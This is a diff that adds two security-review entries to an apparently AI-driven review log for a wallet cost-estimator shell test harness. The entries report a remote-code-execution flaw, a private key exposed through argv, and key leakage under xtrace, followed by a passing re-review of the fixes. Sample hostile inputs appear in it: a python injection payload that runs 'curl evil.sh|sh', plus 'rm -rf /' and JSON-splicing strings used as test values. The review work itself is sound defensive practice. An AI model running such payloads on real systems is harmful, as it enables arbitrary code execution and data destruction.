@@ -1,3 +1,184 @@
+## Tick 85 (re-review) — R23 cost-estimator fixes
+
+**Date:** 2026-05-30
+**Verdict:** PASS (zero findings — all prior findings CLOSED)
+
+### H1 status: CLOSED
+RPC `hex` no longer interpolated into python source. `_cost_get_balance_wei`
+regex-gates the RPC `result` via shell `case` (`0x[0-9a-fA-F]*`) and then
+passes the value via `CE_HEX` env var to `python3 -c "import os;
+print(int(os.environ['CE_HEX'], 16))"`. Even if the case-glob is loose
+(matches any tail after one hex char), `int(_, 16)` in python parses the
+env var as a *string literal*, not as code — RCE is impossible. The
+JSON-parse step also uses `CE_RESP` env var, not source interpolation.
+`need` / `short` / `_cost_format_stt` / final compare all use the same
+env-var pattern. Manual injection probe (`CE_HEX='0xa; os.system(...)'`)
+correctly raises `ValueError`, no code execution.
+
+### M1 status: CLOSED
+Private key piped via `printf '%s' "$key" | node ... -e "...readFileSync(0,
+'utf8').trim()..."`. Verified `printf` is a bash builtin (`type printf`
+→ `shell builtin`) on both interactive and non-interactive bash, so no
+forked process holds the key in argv. Node reads from fd 0; key never
+enters argv of any process. Local `key` var cleared after use.
+
+### L1 status: CLOSED
+`prev_x="$-"` captures xtrace state, `set +x` disables around key
+handling, `case "$prev_x" in *x*) set -x ;;` restores on both
+early-return (missing key, line 54) and success (line 68) paths. Node
+heredoc body is between `set +x` and the restore, so `set -x` callers
+no longer echo the key. Minor: no `trap` for unexpected mid-fn exit,
+but no abort points between disable + restore that would leak.
+
+### L2 status: CLOSED
+`_cost_is_valid_address` enforces strict `0x` + exactly 40 hex chars
+via explicit-class case glob (40 bracketed `[0-9a-fA-F]`). Called inside
+`_cost_get_balance_wei` BEFORE the RPC body is built, so caller-supplied
+addresses (including the `assert_wallet_sufficient` 4th-arg path) are
+validated even though `assert_wallet_sufficient` doesn't re-validate.
+T7 confirms `evil"]} injection` is rejected with rc≠0.
+
+### Additional verification
+- `_cost_is_nonneg_int` (`''|*[!0-9]*) return 1`) rejects empty,
+  negative (`-` is non-digit), and shell-injection-shaped strings.
+- T7 (invalid address), T8 (negative writes), T8b (`'1; rm -rf /'`-
+  shaped writes) all PASS. Full suite: 9/9 passing.
+- T3 + T6 still pass — spec's loud failure message format preserved
+  exactly (`<scenario>: insufficient balance: needed X STT, have Y STT,
+  short Z STT — fund <addr> at https://testnet.somnia.network/`).
+
+### New findings: none
+The env-var-into-python pattern is consistently applied (`CE_RESP`,
+`CE_HEX`, `CE_W/A/G/F/AF`, `CE_HAVE`, `CE_NEED`, `CE_WEI`). All values
+are immediately cast via `int()` or `json.loads()`; no `eval`, no shell
+expansion in python source. No new attack surface introduced.
+
+---
+
+## Tick 85 — SPEC-0005 R23 cost-estimator (security-review)
+
+**Date:** 2026-05-30
+**Verdict:** FAIL (1 HIGH, 1 MEDIUM, 2 LOW, 1 NIT)
+
+### Scope
+
+- `web/tests/agent-browser/cost-estimator.sh` — new `assert_wallet_sufficient`
+  helper, address derivation from `.env`, RPC balance lookup, wei→STT
+  formatting, shortfall printf.
+- `web/tests/agent-browser/cost-estimator.test.sh` — synthetic-address unit
+  tests using `COST_TEST_BALANCE_WEI` and `COST_FORCE_CHECK`.
+- `web/tests/agent-browser/run.sh` — `. cost-estimator.sh` at top + a single
+  `assert_wallet_sufficient "Scenario A" 6 1 || exit 2` call in Scenario A.
+
+### HIGH
+
+**H1 — RPC-response → shell-interpolated `python3 -c` enables RCE if RPC is
+attacker-controlled (line 81).**
+
+The `hex` value returned by the RPC is interpolated **into the python source
+string**, not passed via stdin/argv:
+
+```sh
+hex="$(printf '%s' "$resp" | python3 -c "import sys,json; print(json.load(sys.stdin).get('result',''))")"
+# ...
+python3 -c "print(int('$hex', 16))"        # <-- $hex interpolated
+```
+
+A malicious RPC returning a `result` like
+`0', 16)) or __import__('os').system('curl evil.sh|sh') #` is parsed by the
+first python step into `hex`, then **executed as python source** by the second
+step. Same vector applies indirectly to `_cost_format_stt` (`f'{int("$1")/1e18}'`)
+and to the `need`/`have`/`short` arithmetic `python3 -c "print(int('$have') >= ...)"`
+— `$have` flows from RPC.
+
+`COST_RPC_URL` is overridable via `VITE_RPC_URL`/`RPC_URL`, and the default
+endpoint is third-party-operated. Any future redirection, MITM (HTTPS pin
+not enforced — curl `-sf` accepts the system CA), or compromised testnet
+gateway converts a balance check into arbitrary code execution on the dev
+box (and on CI).
+
+**Fix:** validate `hex` is `^0x[0-9a-fA-F]+$` before passing it onward, or
+pipe it via stdin to a self-contained `python3 -c '...'` block, e.g.
+
+```sh
+hex="$(printf '%s' "$resp" | python3 -c 'import sys,json,re
+r=json.load(sys.stdin).get("result","")
+sys.exit(2) if not re.fullmatch(r"0x[0-9a-fA-F]+", r) else print(int(r,16))')"
+```
+
+Apply the same pattern to `_cost_format_stt` and the `need >= have` compare:
+pass numbers as env vars / stdin, never interpolate.
+
+### MEDIUM
+
+**M1 — Private key passed via `node -e ... "$key"` argv (line 55) is visible
+in `ps -ef` / `/proc/<pid>/cmdline`.**
+
+On a multi-tenant host or a CI runner with sibling jobs, any process able to
+read `/proc/<pid>/cmdline` (typically world-readable on Linux unless
+`hidepid=2` is set) sees the full key for the ~200ms node lifetime. The
+comment on line 50 explicitly acknowledges "Pass the key via argv so it
+never appears in process listing as part of the script body" — but argv
+**is** the process listing.
+
+**Fix:** pipe the key via stdin instead, and read `process.stdin` in the
+node snippet:
+
+```sh
+printf '%s' "$key" | node --input-type=module -e "
+  import { Wallet } from 'ethers'; import { readFileSync } from 'fs';
+  const key = readFileSync(0,'utf8').trim();
+  process.stdout.write(new Wallet(key).address);
+"
+```
+
+### LOW
+
+**L1 — `set -x` in any caller leaks the key (line 55).** The helper does not
+defensively wrap the derive call in `{ set +x; } 2>/dev/null` before the
+key-bearing invocation. `run.sh` does not enable `-x` today, but ad-hoc
+debugging (`bash -x run.sh`) would echo the literal key to stderr / CI logs.
+Add `{ set +x; } 2>/dev/null` around the node call and restore on exit.
+
+**L2 — Caller-supplied `WALLET_ADDR` is JSON-body-interpolated without
+validation (line 73).** A non-conforming `addr` (e.g. `0xdead","x":"y`) is
+spliced into the JSON-RPC body. The RPC will likely just error, but a
+crafted value can smuggle extra params or break the parser into returning
+attacker-controlled text. Validate `addr` against `^0x[0-9a-fA-F]{40}$`
+before use. The 4th-arg path is the only externally-callable input; tests
+already pass clean hex, but the helper is now a generic library.
+
+### NIT
+
+**N1 — Sim-mode gate is fail-open (line 102).** Acceptable today (a wrongly
+set `VITE_WALLET_MODE=real` aborts loudly with a funding hint rather than
+burning funds), but the truthiness check `[ ... != "real" ]` means a typo'd
+`"Real"` / `"REAL"` skips the check silently. Lower-case the comparison or
+match `^(real|REAL)$` for symmetry with the rest of the harness.
+
+### Confirmed safe (no finding)
+
+- `.env` grep idiom (Q3): `^VITE_PRIVATE_KEY=` regex correctly rejects
+  comment lines and leading-whitespace lines; quote-stripping handles single
+  and double quotes; multi-line `.env` values aren't supported but aren't a
+  real-world `.env` shape.
+- `printf` format string (Q5): the format is a literal; `$scenario` flows
+  into a `%s` arg, so `%n` is treated as data, not a directive. Bash's
+  builtin `printf` does not honor `%n` in `%s` arguments anyway.
+- Test file (Q8): synthetic `0xDEAD...` and `0x0000...0001` addresses only;
+  `unset VITE_WALLET_MODE COST_FORCE_CHECK COST_TEST_BALANCE_WEI` before T1
+  prevents env-bleed; `COST_TEST_BALANCE_WEI` short-circuits the RPC path so
+  the test never touches a real key.
+
+### Recommended action
+
+H1 must be fixed before merge — RCE-via-RPC on a developer's machine is not
+acceptable even for a test harness, and the helper is sourced unconditionally
+by `run.sh`. M1, L1, L2 should follow in the same fix (single-file patch).
+N1 may slip to a follow-up.
+
+---
+
 ## Tick 83 — R11 key-paste derived-address (security-review)
 
 **Date:** 2026-05-30
